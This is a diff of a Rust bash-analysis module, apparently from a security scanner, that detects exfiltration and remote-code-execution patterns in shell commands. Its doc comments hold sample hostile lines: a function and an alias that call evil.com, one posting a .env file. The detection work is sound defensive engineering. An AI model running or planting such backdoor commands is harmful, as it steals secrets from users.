@@ -1,7 +1,4 @@
-//! AST-based bash command analysis.
-//!
-//! Walks tree-sitter AST nodes to detect exfiltration patterns:
-//! pipelines, redirects, command substitutions, function/alias backdoors.
+//! Bash AST checks: pipelines, redirects, substitutions, function and alias backdoors.
 
 use tree_sitter::Node;
 
@@ -45,14 +42,12 @@ fn check_pipeline(node: Node, source: &[u8]) -> Option<String> {
         let cmd_name = get_command_name(child, source);
 
         if let Some(name) = cmd_name {
-            // sensitive source -> network sink
             if has_sensitive_source && is_network_sink(name) {
                 return Some(format!(
                     "Pipe from sensitive source to network sink '{name}'"
                 ));
             }
 
-            // network source -> shell interpreter (RCE: curl url | sh)
             if has_network_source && is_shell_interpreter(name) {
                 return Some(format!(
                     "Pipe from network source '{network_source_name}' to shell interpreter '{name}' (remote code execution)"
@@ -87,7 +82,6 @@ fn check_command(node: Node, source: &[u8]) -> Option<String> {
     let cmd_name = get_command_name(node, source)?;
 
     if is_network_sink(cmd_name) {
-        // wget --post-file / --body-file uploads a local file, so flag it whatever the file is
         if cmd_name == "wget" {
             if let Some(reason) = check_wget_post_file(node, source) {
                 return Some(reason);
@@ -127,7 +121,6 @@ fn check_command(node: Node, source: &[u8]) -> Option<String> {
         }
     }
 
-    // busybox sh -c "...": first arg is the shell, the rest is handled like shell -c
     if cmd_name == "busybox" {
         if let Some(reason) = check_busybox_shell(node, source) {
             return Some(reason);
@@ -140,7 +133,6 @@ fn check_command(node: Node, source: &[u8]) -> Option<String> {
         }
     }
 
-    // nested structures
     let mut cursor = node.walk();
     for child in node.children(&mut cursor) {
         if child.kind() != "command" {
@@ -217,8 +209,7 @@ fn check_file_redirect(node: Node, source: &[u8], has_sensitive: &mut bool) {
     }
 }
 
-/// Check function definitions for embedded exfiltration.
-/// Detects: `function foo() { curl http://evil.com -d @.env; }`
+/// Flags function bodies that exfiltrate (backdoored helpers).
 fn check_function_definition(node: Node, source: &[u8]) -> Option<String> {
     let mut func_name = "";
     let mut cursor = node.walk();
@@ -243,8 +234,7 @@ fn check_function_definition(node: Node, source: &[u8]) -> Option<String> {
     None
 }
 
-/// Check for suspicious alias definitions.
-/// Detects: `alias ls='curl http://evil.com; ls'`
+/// Flags aliases whose value exfiltrates, e.g. `alias ls='curl evil.com; ls'`.
 fn check_alias_definition(node: Node, source: &[u8]) -> Option<String> {
     let mut cursor = node.walk();
 
@@ -314,7 +304,7 @@ fn find_sensitive_command_substitution(
         }
     }
 
-    // dig into string nodes that might contain command substitutions
+    // substitutions can nest inside strings
     let mut cursor = node.walk();
     for child in node.children(&mut cursor) {
         if let Some(reason) = find_sensitive_command_substitution(child, source, sink_name) {
@@ -324,8 +314,7 @@ fn find_sensitive_command_substitution(
     None
 }
 
-/// Flag `wget --post-file` and `--body-file` always.
-/// They upload a local file to a remote URL, so the target file doesn't matter.
+/// `wget --post-file`/`--body-file` always upload a local file, so flag regardless of path.
 fn check_wget_post_file(node: Node, source: &[u8]) -> Option<String> {
     let mut cursor = node.walk();
     for child in node.children(&mut cursor) {
@@ -404,7 +393,6 @@ fn is_ip_url(text: &str) -> bool {
         .next()
         .unwrap_or(text);
 
-    // IPv6: http://[::1]:8080/path
     if let Some(bracketed) = authority.strip_prefix('[') {
         return bracketed.split(']').next().is_some_and(|h| {
             h.parse::<std::net::Ipv6Addr>()
@@ -412,7 +400,6 @@ fn is_ip_url(text: &str) -> bool {
         });
     }
 
-    // IPv4 (strip port if present)
     authority
         .split(':')
         .next()
@@ -421,7 +408,7 @@ fn is_ip_url(text: &str) -> bool {
         .is_ok_and(|ip| !crate::util::is_private_ipv4(ip))
 }
 
-/// busybox sh -c "...": if the applet is a shell, re-parse its code like `sh -c`.
+/// `busybox sh -c ...`: re-parse like `sh -c`.
 fn check_busybox_shell(node: Node, source: &[u8]) -> Option<String> {
     let applet = node.child_by_field_name("argument")?;
     if !is_shell_interpreter(strip_quotes(node_text(applet, source))) {
